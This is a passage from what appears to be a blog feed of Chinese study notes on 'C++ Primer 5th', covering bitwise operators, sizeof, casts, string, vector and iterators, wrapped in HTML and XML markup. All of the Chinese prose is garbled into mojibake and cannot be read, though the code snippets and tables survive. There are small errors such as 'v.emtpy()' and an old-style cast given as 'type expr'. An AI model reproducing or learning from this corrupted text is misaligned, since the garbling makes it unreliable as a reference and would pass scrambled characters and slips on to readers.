class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- è¾“å‡ºè¡¨è¾¾å¼ä½¿ç”¨æ¡ä»¶è¿ç®—ç¬¦è®°å¾—åŠ æ‹¬å·ï¼Œæ¡ä»¶è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤ªä½ã€‚</span><br><span class="line"></span><br><span class="line">## ä½è¿ç®—ç¬¦</span><br><span class="line"></span><br><span class="line">ç”¨äºæ£€æŸ¥å’Œè®¾ç½®äºŒè¿›åˆ¶ä½çš„åŠŸèƒ½ã€‚</span><br><span class="line"></span><br><span class="line">- ä½è¿ç®—ç¬¦æ˜¯ä½œç”¨äº**æ•´æ•°ç±»å‹**çš„è¿ç®—å¯¹è±¡ã€‚</span><br><span class="line">- äºŒè¿›åˆ¶ä½å‘å·¦ç§»ï¼ˆ`&lt;&lt;`ï¼‰æˆ–è€…å‘å³ç§»ï¼ˆ`&gt;&gt;`ï¼‰ï¼Œç§»å‡ºè¾¹ç•Œå¤–çš„ä½å°±è¢«èˆå¼ƒæ‰äº†ã€‚</span><br><span class="line">- ä½å–åï¼ˆ`~`ï¼‰ï¼ˆé€ä½æ±‚åï¼‰ã€ä¸ï¼ˆ`&amp;`ï¼‰ã€æˆ–ï¼ˆ`|`ï¼‰ã€å¼‚æˆ–ï¼ˆ`^`ï¼‰</span><br><span class="line"></span><br><span class="line">æœ‰ç¬¦å·æ•°è´Ÿå€¼å¯èƒ½ç§»ä½åå˜å·ï¼Œæ‰€ä»¥å¼ºçƒˆå»ºè®®**ä½è¿ç®—ç¬¦ä»…ç”¨äºæ— ç¬¦å·æ•°**ã€‚</span><br><span class="line"></span><br><span class="line">åº”ç”¨ï¼š</span><br><span class="line"></span><br><span class="line">```c++</span><br><span class="line">unsigned long quiz1 = 0;    // æ¯ä¸€ä½ä»£è¡¨ä¸€ä¸ªå­¦ç”Ÿæ˜¯å¦é€šè¿‡è€ƒè¯•</span><br><span class="line">1UL &lt;&lt; 12;  // ä»£è¡¨ç¬¬12ä¸ªå­¦ç”Ÿé€šè¿‡</span><br><span class="line">quiz1 |= (1UL &lt;&lt; 12);   // å°†ç¬¬12ä¸ªå­¦ç”Ÿç½®ä¸ºå·²é€šè¿‡</span><br><span class="line">quiz1 &amp;= ~(1UL &lt;&lt; 12);  // å°†ç¬¬12ä¸ªå­¦ç”Ÿä¿®æ”¹ä¸ºæœªé€šè¿‡</span><br><span class="line">bool stu12 = quiz1 &amp; (1UL &lt;&lt; 12);   // åˆ¤æ–­ç¬¬12ä¸ªå­¦ç”Ÿæ˜¯å¦é€šè¿‡</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><blockquote><p>ä½è¿ç®—ç¬¦ä½¿ç”¨è¾ƒå°‘ï¼Œä½†æ˜¯é‡è½½coutã€cinå¤§å®¶éƒ½ç”¨è¿‡</p></blockquote><p>ä½è¿ç®—ç¬¦æ»¡è¶³å·¦ç»“åˆå¾‹ï¼Œä¼˜å…ˆçº§ä»‹äºä¸­é—´ï¼Œä½¿ç”¨æ—¶å°½é‡åŠ æ‹¬å·ã€‚</p><h2 id="sizeofè¿ç®—ç¬¦">sizeofè¿ç®—ç¬¦</h2><ul><li>è¿”å›ä¸€æ¡è¡¨è¾¾å¼æˆ–ä¸€ä¸ªç±»å‹åå­—æ‰€å çš„<strong>å­—èŠ‚æ•°</strong>ã€‚</li><li>è¿”å›çš„ç±»å‹æ˜¯ <code>size_t</code>çš„å¸¸é‡è¡¨è¾¾å¼ã€‚</li><li><code>sizeof</code>å¹¶ä¸å®é™…è®¡ç®—å…¶è¿ç®—å¯¹è±¡çš„å€¼ã€‚</li><li>ä¸¤ç§å½¢å¼ï¼š<ol><li><code>sizeof (type)</code>ï¼Œç»™å‡ºç±»å‹å</li><li><code>sizeof expr</code>ï¼Œç»™å‡ºè¡¨è¾¾å¼</li></ol></li><li>å¯ç”¨sizeofè¿”å›æ•°ç»„çš„å¤§å°</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ia[<span class="number">10</span>];</span><br><span class="line"><span class="comment">// sizeof(ia)è¿”å›æ•´ä¸ªæ•°ç»„æ‰€å ç©ºé—´çš„å¤§å°</span></span><br><span class="line"><span class="comment">// sizeof(ia)/sizeof(*ia)è¿”å›æ•°ç»„çš„å¤§å°</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span> sz = <span class="built_in">sizeof</span>(ia)/<span class="built_in">sizeof</span>(*ia);</span><br><span class="line"><span class="type">int</span> arr[sz];</span><br></pre></td></tr></table></figure><h2 id="é€—å·è¿ç®—ç¬¦">é€—å·è¿ç®—ç¬¦</h2><p>ä»å·¦å‘å³ä¾æ¬¡æ±‚å€¼ã€‚</p><p>å·¦ä¾§æ±‚å€¼ç»“æœä¸¢å¼ƒï¼Œé€—å·è¿ç®—ç¬¦<strong>ç»“æœæ˜¯å³ä¾§è¡¨è¾¾å¼</strong>çš„å€¼ã€‚</p><h2 id="ç±»å‹è½¬æ¢">ç±»å‹è½¬æ¢</h2><h3 id="éšå¼ç±»å‹è½¬æ¢">éšå¼ç±»å‹è½¬æ¢</h3><blockquote><p>è®¾è®¡ä¸ºå°½å¯èƒ½é¿å…æŸå¤±ç²¾åº¦ï¼Œå³è½¬æ¢ä¸ºæ›´ç²¾ç»†ç±»å‹ã€‚</p></blockquote><ul><li>æ¯” <code>int</code>ç±»å‹å°çš„æ•´æ•°å€¼å…ˆæå‡ä¸ºè¾ƒå¤§çš„æ•´æ•°ç±»å‹ã€‚</li><li>æ¡ä»¶ä¸­ï¼Œéå¸ƒå°”è½¬æ¢æˆå¸ƒå°”ã€‚</li><li>åˆå§‹åŒ–ä¸­ï¼Œåˆå§‹å€¼è½¬æ¢æˆå˜é‡çš„ç±»å‹ã€‚</li><li>ç®—æœ¯è¿ç®—æˆ–è€…å…³ç³»è¿ç®—çš„è¿ç®—å¯¹è±¡æœ‰å¤šç§ç±»å‹ï¼Œè¦è½¬æ¢æˆåŒä¸€ç§ç±»å‹ã€‚</li><li>å‡½æ•°è°ƒç”¨æ—¶ä¹Ÿä¼šæœ‰è½¬æ¢ã€‚</li></ul><h4 id="ç®—æœ¯è½¬æ¢">ç®—æœ¯è½¬æ¢</h4><h5 id="æ•´å‹æå‡">æ•´å‹æå‡</h5><ul><li>å¸¸è§çš„charã€boolã€shortèƒ½å­˜åœ¨intå°±ä¼šè½¬æ¢æˆintï¼Œå¦åˆ™æå‡ä¸º<code>unsigned int</code></li><li><code>wchar_t,char16_t,char32_t</code>æå‡ä¸ºæ•´å‹ä¸­<code>int,long,long long â€¦â€¦</code>æœ€å°çš„ï¼Œä¸”èƒ½å®¹çº³åŸç±»å‹æ‰€æœ‰å¯èƒ½å€¼çš„ç±»å‹ã€‚</li></ul><h4 id="å…¶ä»–è½¬æ¢">å…¶ä»–è½¬æ¢</h4><blockquote><p>p143</p></blockquote><h3 id="æ˜¾å¼ç±»å‹è½¬æ¢ï¼ˆå°½é‡é¿å…ï¼‰">æ˜¾å¼ç±»å‹è½¬æ¢ï¼ˆå°½é‡é¿å…ï¼‰</h3><ul><li><p><strong>static_cast</strong>ï¼šä»»ä½•æ˜ç¡®å®šä¹‰çš„ç±»å‹è½¬æ¢ï¼Œåªè¦ä¸åŒ…å«åº•å±‚constï¼Œéƒ½å¯ä»¥ä½¿ç”¨ã€‚ <code>double slope = static_cast&lt;double&gt;(j);</code></p></li><li><p><strong>dynamic_cast</strong>ï¼šæ”¯æŒè¿è¡Œæ—¶ç±»å‹è¯†åˆ«ã€‚</p></li><li><p><strong>const_cast</strong>ï¼šåªèƒ½æ”¹å˜è¿ç®—å¯¹è±¡çš„åº•å±‚constï¼Œä¸€èˆ¬å¯ç”¨äºå»é™¤constæ€§è´¨ã€‚ <code>const char *pc; char *p = const_cast&lt;char*&gt;(pc)</code></p><blockquote><p>åªæœ‰å…¶å¯ä»¥æ”¹å˜å¸¸é‡å±æ€§</p></blockquote></li><li><p><strong>reinterpret_cast</strong>ï¼šé€šå¸¸ä¸ºè¿ç®—å¯¹è±¡çš„ä½æ¨¡å¼æä¾›ä½å±‚æ¬¡ä¸Šçš„é‡æ–°è§£é‡Šã€‚</p></li></ul><h4 id="æ—§å¼å¼ºåˆ¶ç±»å‹è½¬æ¢">æ—§å¼å¼ºåˆ¶ç±»å‹è½¬æ¢</h4><p><code>type expr</code></p><h2 id="è¿ç®—ç¬¦ä¼˜å…ˆçº§è¡¨">è¿ç®—ç¬¦ä¼˜å…ˆçº§è¡¨</h2><blockquote><p>p147</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> ã€ŠC++ Primer 5thã€‹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬3ç«  å­—ç¬¦ä¸²ã€å‘é‡å’Œæ•°ç»„</title>
      <link href="/2023/05/12/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch03/"/>
      <url>/2023/05/12/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch03/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬3ç« -å­—ç¬¦ä¸²ã€å‘é‡å’Œæ•°ç»„">ç¬¬3ç«  å­—ç¬¦ä¸²ã€å‘é‡å’Œæ•°ç»„</h1><h2 id="usingå£°æ˜">usingå£°æ˜</h2><ul><li>ä½¿ç”¨æŸä¸ªå‘½åç©ºé—´ï¼šä¾‹å¦‚ <code>using std::cin</code>è¡¨ç¤ºä½¿ç”¨å‘½åç©ºé—´<code>std</code>ä¸­çš„åå­—<code>cin</code>ã€‚</li><li>å¤´æ–‡ä»¶ä¸­ä¸åº”è¯¥åŒ…å«<code>using</code>å£°æ˜ã€‚è¿™æ ·ä½¿ç”¨äº†è¯¥å¤´æ–‡ä»¶çš„æºç ä¹Ÿä¼šä½¿ç”¨è¿™ä¸ªå£°æ˜ï¼Œä¼šå¸¦æ¥é£é™©ã€‚</li></ul><h2 id="string">string</h2><ul><li>æ ‡å‡†åº“ç±»å‹<code>string</code>è¡¨ç¤ºå¯å˜é•¿çš„å­—ç¬¦åºåˆ—ã€‚</li><li><code>#include &lt;string&gt;</code>ï¼Œç„¶å <code>using std::string;</code></li><li><strong>stringå¯¹è±¡</strong>ï¼šæ³¨æ„ï¼Œä¸åŒäºå­—ç¬¦ä¸²å­—é¢å€¼ã€‚</li></ul><h3 id="å®šä¹‰å’Œåˆå§‹åŒ–stringå¯¹è±¡">å®šä¹‰å’Œåˆå§‹åŒ–stringå¯¹è±¡</h3><p>åˆå§‹åŒ–<code>string</code>å¯¹è±¡çš„æ–¹å¼ï¼š</p><table><thead><tr><th>æ–¹å¼</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>string s1</code></td><td>é»˜è®¤åˆå§‹åŒ–ï¼Œ<code>s1</code>æ˜¯ä¸ªç©ºå­—ç¬¦ä¸²</td></tr><tr><td><code>string s2(s1)</code></td><td><code>s2</code>æ˜¯<code>s1</code>çš„å‰¯æœ¬</td></tr><tr><td><code>string s2 = s1</code></td><td>ç­‰ä»·äº<code>s2(s1)</code>ï¼Œ<code>s2</code>æ˜¯<code>s1</code>çš„å‰¯æœ¬</td></tr><tr><td><code>string s3(&quot;value&quot;)</code></td><td><code>s3</code>æ˜¯å­—é¢å€¼â€œvalueâ€çš„å‰¯æœ¬ï¼Œé™¤äº†å­—é¢å€¼æœ€åçš„é‚£ä¸ªç©ºå­—ç¬¦å¤–</td></tr><tr><td><code>string s3 = &quot;value&quot;</code></td><td>ç­‰ä»·äº<code>s3(&quot;value&quot;)</code>ï¼Œ<code>s3</code>æ˜¯å­—é¢å€¼&quot;value&quot;çš„å‰¯æœ¬</td></tr><tr><td><code>string s4(n, 'c')</code></td><td>æŠŠ<code>s4</code>åˆå§‹åŒ–ä¸ºç”±è¿ç»­<code>n</code>ä¸ªå­—ç¬¦<code>c</code>ç»„æˆçš„ä¸²</td></tr></tbody></table><ul><li>æ‹·è´åˆå§‹åŒ–ï¼ˆcopy initializationï¼‰ï¼šä½¿ç”¨ç­‰å·<code>=</code>å°†ä¸€ä¸ªå·²æœ‰çš„å¯¹è±¡æ‹·è´åˆ°æ­£åœ¨åˆ›å»ºçš„å¯¹è±¡ã€‚</li><li>ç›´æ¥åˆå§‹åŒ–ï¼ˆdirect initializationï¼‰ï¼šé€šè¿‡æ‹¬å·ç»™å¯¹è±¡èµ‹å€¼ã€‚</li></ul><h3 id="stringå¯¹è±¡ä¸Šçš„æ“ä½œ">stringå¯¹è±¡ä¸Šçš„æ“ä½œ</h3><p><code>string</code>çš„æ“ä½œï¼š</p><table><thead><tr><th>æ“ä½œ</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>os &lt;&lt; s</code></td><td>å°†<code>s</code>å†™åˆ°è¾“å‡ºæµ<code>os</code>å½“ä¸­ï¼Œè¿”å›<code>os</code></td></tr><tr><td><code>is &gt;&gt; s</code></td><td>ä»<code>is</code>ä¸­è¯»å–å­—ç¬¦ä¸²èµ‹ç»™<code>s</code>ï¼Œå­—ç¬¦ä¸²ä»¥ç©ºç™½åˆ†å‰²ï¼Œè¿”å›<code>is</code></td></tr><tr><td><code>getline(is, s)</code></td><td>ä»<code>is</code>ä¸­è¯»å–ä¸€è¡Œèµ‹ç»™<code>s</code>ï¼Œè¿”å›<code>is</code></td></tr><tr><td><code>s.empty()</code></td><td><code>s</code>ä¸ºç©ºè¿”å›<code>true</code>ï¼Œå¦åˆ™è¿”å›<code>false</code></td></tr><tr><td><code>s.size()</code></td><td>è¿”å›<code>s</code>ä¸­å­—ç¬¦çš„ä¸ªæ•°</td></tr><tr><td><code>s[n]</code></td><td>è¿”å›<code>s</code>ä¸­ç¬¬<code>n</code>ä¸ªå­—ç¬¦çš„å¼•ç”¨ï¼Œä½ç½®<code>n</code>ä»0è®¡èµ·</td></tr><tr><td><code>s1+s2</code></td><td>è¿”å›<code>s1</code>å’Œ<code>s2</code>è¿æ¥åçš„ç»“æœ</td></tr><tr><td><code>s1=s2</code></td><td>ç”¨<code>s2</code>çš„å‰¯æœ¬ä»£æ›¿<code>s1</code>ä¸­åŸæ¥çš„å­—ç¬¦</td></tr><tr><td><code>s1==s2</code></td><td>å¦‚æœ<code>s1</code>å’Œ<code>s2</code>ä¸­æ‰€å«çš„å­—ç¬¦å®Œå…¨ä¸€æ ·ï¼Œåˆ™å®ƒä»¬ç›¸ç­‰ï¼›<code>string</code>å¯¹è±¡çš„ç›¸ç­‰æ€§åˆ¤æ–­å¯¹å­—æ¯çš„å¤§å°å†™æ•æ„Ÿ</td></tr><tr><td><code>s1!=s2</code></td><td>åŒä¸Š</td></tr><tr><td><code>&lt;</code>, <code>&lt;=</code>, <code>&gt;</code>, <code>&gt;=</code></td><td>åˆ©ç”¨å­—ç¬¦åœ¨å­—å…¸ä¸­çš„é¡ºåºè¿›è¡Œæ¯”è¾ƒï¼Œä¸”å¯¹å­—æ¯çš„å¤§å°å†™æ•æ„Ÿï¼ˆå¯¹ç¬¬ä¸€ä¸ªä¸ç›¸åŒçš„ä½ç½®è¿›è¡Œæ¯”è¾ƒï¼‰</td></tr></tbody></table><ul><li>string ioï¼š<ul><li>æ‰§è¡Œè¯»æ“ä½œ<code>&gt;&gt;</code>ï¼šå¿½ç•¥æ‰å¼€å¤´çš„ç©ºç™½ï¼ˆåŒ…æ‹¬ç©ºæ ¼ã€æ¢è¡Œç¬¦å’Œåˆ¶è¡¨ç¬¦ï¼‰ï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€å¤„ç©ºç™½ä¸ºæ­¢ã€‚</li><li><code>getline</code>ï¼šè¯»å–ä¸€æ•´è¡Œï¼Œ<strong>åŒ…æ‹¬ç©ºç™½ç¬¦</strong>ã€‚</li></ul></li><li><code>s.size()</code>è¿”å›çš„æ—¶<code>string::size_type</code>ç±»å‹ï¼Œè®°ä½æ˜¯ä¸€ä¸ª<strong>æ— ç¬¦å·</strong>ç±»å‹çš„å€¼ï¼Œä¸è¦å’Œ<code>int</code>æ··ç”¨</li><li><code>s1+s2</code>ä½¿ç”¨æ—¶ï¼Œä¿è¯è‡³å°‘ä¸€ä¾§æ˜¯stringç±»å‹ã€‚<code>string s1 = &quot;hello&quot; + &quot;world&quot; // é”™è¯¯ï¼Œä¸¤ä¾§å‡ä¸ºå­—ç¬¦ä¸²å­—é¢å€¼</code></li><li><strong>å­—ç¬¦ä¸²å­—é¢å€¼å’Œstringæ˜¯ä¸åŒçš„ç±»å‹ã€‚</strong></li></ul><h3 id="å¤„ç†stringå¯¹è±¡ä¸­çš„å­—ç¬¦">å¤„ç†stringå¯¹è±¡ä¸­çš„å­—ç¬¦</h3><ul><li><strong>ctype.h vs. cctype</strong>ï¼šC++ä¿®æ”¹äº†cçš„æ ‡å‡†åº“ï¼Œåç§°ä¸ºå»æ‰<code>.h</code>ï¼Œå‰é¢åŠ <code>c</code>ã€‚<blockquote><p>å¦‚c++ç‰ˆæœ¬ä¸º<code>cctype</code>ï¼Œcç‰ˆæœ¬ä¸º<code>ctype.h</code></p></blockquote><ul><li><strong>å°½é‡ä½¿ç”¨c++ç‰ˆæœ¬çš„å¤´æ–‡ä»¶</strong>ï¼Œå³<code>cctype</code></li></ul></li></ul><p><code>cctype</code>å¤´æ–‡ä»¶ä¸­å®šä¹‰äº†ä¸€ç»„æ ‡å‡†å‡½æ•°ï¼š</p><table><thead><tr><th>å‡½æ•°</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>isalnum(c)</code></td><td>å½“<code>c</code>æ˜¯å­—æ¯æˆ–æ•°å­—æ—¶ä¸ºçœŸ</td></tr><tr><td><code>isalpha(c)</code></td><td>å½“<code>c</code>æ˜¯å­—æ¯æ—¶ä¸ºçœŸ</td></tr><tr><td><code>iscntrl(c)</code></td><td>å½“<code>c</code>æ˜¯æ§åˆ¶å­—ç¬¦æ—¶ä¸ºçœŸ</td></tr><tr><td><code>isdigit(c)</code></td><td>å½“<code>c</code>æ˜¯æ•°å­—æ—¶ä¸ºçœŸ</td></tr><tr><td><code>isgraph(c)</code></td><td>å½“<code>c</code>ä¸æ˜¯ç©ºæ ¼ä½†å¯ä»¥æ‰“å°æ—¶ä¸ºçœŸ</td></tr><tr><td><code>islower(c)</code></td><td>å½“<code>c</code>æ˜¯å°å†™å­—æ¯æ—¶ä¸ºçœŸ</td></tr><tr><td><code>isprint(c)</code></td><td>å½“<code>c</code>æ˜¯å¯æ‰“å°å­—ç¬¦æ—¶ä¸ºçœŸ</td></tr><tr><td><code>ispunct(c)</code></td><td>å½“<code>c</code>æ˜¯æ ‡ç‚¹ç¬¦å·æ—¶ä¸ºçœŸ</td></tr><tr><td><code>isspace(c)</code></td><td>å½“<code>c</code>æ˜¯ç©ºç™½æ—¶ä¸ºçœŸï¼ˆç©ºæ ¼ã€æ¨ªå‘åˆ¶è¡¨ç¬¦ã€çºµå‘åˆ¶è¡¨ç¬¦ã€å›è½¦ç¬¦ã€æ¢è¡Œç¬¦ã€è¿›çº¸ç¬¦ï¼‰</td></tr><tr><td><code>isupper(c)</code></td><td>å½“<code>c</code>æ˜¯å¤§å†™å­—æ¯æ—¶ä¸ºçœŸ</td></tr><tr><td><code>isxdigit(c)</code></td><td>å½“<code>c</code>æ˜¯åå…­è¿›åˆ¶æ•°å­—æ—¶ä¸ºçœŸ</td></tr><tr><td><code>tolower(c)</code></td><td>å½“<code>c</code>æ˜¯å¤§å†™å­—æ¯ï¼Œè¾“å‡ºå¯¹åº”çš„å°å†™å­—æ¯ï¼›å¦åˆ™åŸæ ·è¾“å‡º<code>c</code></td></tr><tr><td><code>toupper(c)</code></td><td>å½“<code>c</code>æ˜¯å°å†™å­—æ¯ï¼Œè¾“å‡ºå¯¹åº”çš„å¤§å†™å­—æ¯ï¼›å¦åˆ™åŸæ ·è¾“å‡º<code>c</code></td></tr></tbody></table><ul><li>éå†å­—ç¬¦ä¸²ï¼šä½¿ç”¨<strong>èŒƒå›´for</strong>ï¼ˆrange forï¼‰è¯­å¥ï¼š <code>for (auto c: str)</code>ï¼Œæˆ–è€… <code>for (auto &amp;c: str)</code>ä½¿ç”¨å¼•ç”¨ç›´æ¥æ”¹å˜å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ã€‚ ï¼ˆC++11ï¼‰</li><li><code>str[x]</code>,[]è¾“å…¥å‚æ•°ä¸º<code>string::size_type</code>ç±»å‹ï¼Œç»™å‡º<code>int</code>æ•´å‹ä¹Ÿä¼šè‡ªåŠ¨è½¬åŒ–ä¸ºè¯¥ç±»å‹</li></ul><h2 id="vector">vector</h2><ul><li>vectoræ˜¯ä¸€ä¸ª<strong>å®¹å™¨</strong>ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç±»æ¨¡æ¿ï¼›</li><li><code>#include &lt;vector&gt;</code> ç„¶å <code>using std::vector;</code></li><li>å®¹å™¨ï¼šåŒ…å«å…¶ä»–å¯¹è±¡ã€‚</li><li>ç±»æ¨¡æ¿ï¼šæœ¬èº«ä¸æ˜¯ç±»ï¼Œä½†å¯ä»¥<strong>å®ä¾‹åŒ–instantiation</strong>å‡ºä¸€ä¸ªç±»ã€‚ <code>vector</code>æ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œ <code>vector&lt;int&gt;</code>æ˜¯ä¸€ä¸ªç±»å‹ã€‚</li><li>é€šè¿‡å°†ç±»å‹æ”¾åœ¨ç±»æ¨¡æ¿åç§°åé¢çš„<strong>å°–æ‹¬å·</strong>ä¸­æ¥æŒ‡å®š<strong>ç±»å‹</strong>ï¼Œå¦‚<code>vector&lt;int&gt; ivec</code>ã€‚</li></ul><h3 id="å®šä¹‰å’Œåˆå§‹åŒ–vectorå¯¹è±¡">å®šä¹‰å’Œåˆå§‹åŒ–vectorå¯¹è±¡</h3><p>åˆå§‹åŒ–<code>vector</code>å¯¹è±¡çš„æ–¹æ³•</p><table><thead><tr><th>æ–¹æ³•</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>vector&lt;T&gt; v1</code></td><td><code>v1</code>æ˜¯ä¸€ä¸ªç©º<code>vector</code>ï¼Œå®ƒæ½œåœ¨çš„å…ƒç´ æ˜¯<code>T</code>ç±»å‹çš„ï¼Œæ‰§è¡Œé»˜è®¤åˆå§‹åŒ–</td></tr><tr><td><code>vector&lt;T&gt; v2(v1)</code></td><td><code>v2</code>ä¸­åŒ…å«æœ‰<code>v1</code>æ‰€æœ‰å…ƒç´ çš„å‰¯æœ¬</td></tr><tr><td><code>vector&lt;T&gt; v2 = v1</code></td><td>ç­‰ä»·äº<code>v2(v1)</code>ï¼Œ<code>v2</code>ä¸­åŒ…å«<code>v1</code>æ‰€æœ‰å…ƒç´ çš„å‰¯æœ¬</td></tr><tr><td><code>vector&lt;T&gt; v3(n, val)</code></td><td><code>v3</code>åŒ…å«äº†nä¸ªé‡å¤çš„å…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ çš„å€¼éƒ½æ˜¯<code>val</code></td></tr><tr><td><code>vector&lt;T&gt; v4(n)</code></td><td><code>v4</code>åŒ…å«äº†nä¸ªé‡å¤åœ°æ‰§è¡Œäº†å€¼åˆå§‹åŒ–çš„å¯¹è±¡</td></tr><tr><td><code>vector&lt;T&gt; v5&#123;a, b, c...&#125;</code></td><td><code>v5</code>åŒ…å«äº†åˆå§‹å€¼ä¸ªæ•°çš„å…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ è¢«èµ‹äºˆç›¸åº”çš„åˆå§‹å€¼</td></tr><tr><td><code>vector&lt;T&gt; v5=&#123;a, b, c...&#125;</code></td><td>ç­‰ä»·äº<code>v5&#123;a, b, c...&#125;</code></td></tr></tbody></table><ul><li>åˆ—è¡¨åˆå§‹åŒ–ï¼š <code>vector&lt;string&gt; v&#123;&quot;a&quot;, &quot;an&quot;, &quot;the&quot;&#125;;</code> ï¼ˆC++11ï¼‰</li></ul><h3 id="å‘vectorå¯¹è±¡ä¸­æ·»åŠ å…ƒç´ ">å‘vectorå¯¹è±¡ä¸­æ·»åŠ å…ƒç´ </h3><ul><li><code>v.push_back(e)</code> åœ¨å°¾éƒ¨å¢åŠ å…ƒç´ ã€‚</li></ul><h3 id="å…¶ä»–vectoræ“ä½œ">å…¶ä»–vectoræ“ä½œ</h3><p><code>vector</code>æ”¯æŒçš„æ“ä½œï¼š</p><table><thead><tr><th>æ“ä½œ</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>v.emtpy()</code></td><td>å¦‚æœ<code>v</code>ä¸å«æœ‰ä»»ä½•å…ƒç´ ï¼Œè¿”å›çœŸï¼›å¦åˆ™è¿”å›å‡</td></tr><tr><td><code>v.size()</code></td><td>è¿”å›<code>v</code>ä¸­å…ƒç´ çš„ä¸ªæ•°</td></tr><tr><td><code>v.push_back(t)</code></td><td>å‘<code>v</code>çš„å°¾ç«¯æ·»åŠ ä¸€ä¸ªå€¼ä¸º<code>t</code>çš„å…ƒç´ </td></tr><tr><td><code>v[n]</code></td><td>è¿”å›<code>v</code>ä¸­ç¬¬<code>n</code>ä¸ªä½ç½®ä¸Šå…ƒç´ çš„<strong>å¼•ç”¨</strong></td></tr><tr><td><code>v1 = v2</code></td><td>ç”¨<code>v2</code>ä¸­çš„å…ƒç´ æ‹·è´æ›¿æ¢<code>v1</code>ä¸­çš„å…ƒç´ </td></tr><tr><td><code>v1 = &#123;a,b,c...&#125;</code></td><td>ç”¨åˆ—è¡¨ä¸­å…ƒç´ çš„æ‹·è´æ›¿æ¢<code>v1</code>ä¸­çš„å…ƒç´ </td></tr><tr><td><code>v1 == v2</code></td><td><code>v1</code>å’Œ<code>v2</code>ç›¸ç­‰å½“ä¸”ä»…å½“å®ƒä»¬çš„å…ƒç´ æ•°é‡ç›¸åŒä¸”å¯¹åº”ä½ç½®çš„å…ƒç´ å€¼éƒ½ç›¸åŒ</td></tr><tr><td><code>v1 != v2</code></td><td>åŒä¸Š</td></tr><tr><td><code>&lt;</code>,<code>&lt;=</code>,<code>&gt;</code>, <code>&gt;=</code></td><td>ä»¥å­—å…¸é¡ºåºè¿›è¡Œæ¯”è¾ƒ</td></tr></tbody></table><ul><li>èŒƒå›´<code>for</code>è¯­å¥å†…ä¸åº”è¯¥æ”¹å˜å…¶éå†åºåˆ—çš„å¤§å°ã€‚</li><li><code>vector</code>å¯¹è±¡ï¼ˆä»¥åŠ<code>string</code>å¯¹è±¡ï¼‰çš„ä¸‹æ ‡è¿ç®—ç¬¦ï¼Œåªèƒ½å¯¹ç¡®çŸ¥å·²å­˜åœ¨çš„å…ƒç´ æ‰§è¡Œä¸‹æ ‡æ“ä½œï¼Œä¸èƒ½ç”¨äºæ·»åŠ å…ƒç´ ã€‚</li></ul><h2 id="è¿­ä»£å™¨iterator">è¿­ä»£å™¨iterator</h2><ul><li>æ‰€æœ‰æ ‡å‡†åº“å®¹å™¨éƒ½å¯ä»¥ä½¿ç”¨è¿­ä»£å™¨ã€‚</li><li>ç±»ä¼¼äºæŒ‡é’ˆç±»å‹ï¼Œè¿­ä»£å™¨ä¹Ÿæä¾›äº†å¯¹å¯¹è±¡çš„é—´æ¥è®¿é—®ã€‚</li></ul><h3 id="ä½¿ç”¨è¿­ä»£å™¨">ä½¿ç”¨è¿­ä»£å™¨</h3><ul><li><code>vector&lt;int&gt;::iterator iter</code>ã€‚</li><li><code>auto b = v.begin();</code>è¿”å›æŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ çš„è¿­ä»£å™¨ã€‚</li><li><code>auto e = v.end();</code>è¿”å›æŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ çš„ä¸‹ä¸€ä¸ªï¼ˆå“¨å…µï¼Œå°¾å,one past the endï¼‰çš„è¿­ä»£å™¨ï¼ˆoff the endï¼‰ã€‚</li><li>å¦‚æœå®¹å™¨ä¸ºç©ºï¼Œ <code>begin()</code>å’Œ <code>end()</code>è¿”å›çš„æ˜¯åŒä¸€ä¸ªè¿­ä»£å™¨ï¼Œéƒ½æ˜¯å°¾åè¿­ä»£å™¨ã€‚</li><li>ä½¿ç”¨è§£å¼•ç”¨ç¬¦<code>*</code>è®¿é—®è¿­ä»£å™¨æŒ‡å‘çš„å…ƒç´ ã€‚</li><li>å…»æˆä½¿ç”¨è¿­ä»£å™¨å’Œ<code>!=</code>çš„ä¹ æƒ¯ï¼ˆæ³›å‹ç¼–ç¨‹ï¼‰ã€‚</li><li><strong>å®¹å™¨</strong>ï¼šå¯ä»¥åŒ…å«å…¶ä»–å¯¹è±¡ï¼›ä½†æ‰€æœ‰çš„å¯¹è±¡å¿…é¡»ç±»å‹ç›¸åŒã€‚</li><li><strong>è¿­ä»£å™¨ï¼ˆiteratorï¼‰</strong>ï¼šæ¯ç§æ ‡å‡†å®¹å™¨éƒ½æœ‰è‡ªå·±çš„è¿­ä»£å™¨ã€‚<code>C++</code>å€¾å‘äºç”¨è¿­ä»£å™¨è€Œä¸æ˜¯ä¸‹æ ‡éå†å…ƒç´ ã€‚</li><li><strong>const_iterator</strong>ï¼šåªèƒ½è¯»å–å®¹å™¨å†…å…ƒç´ 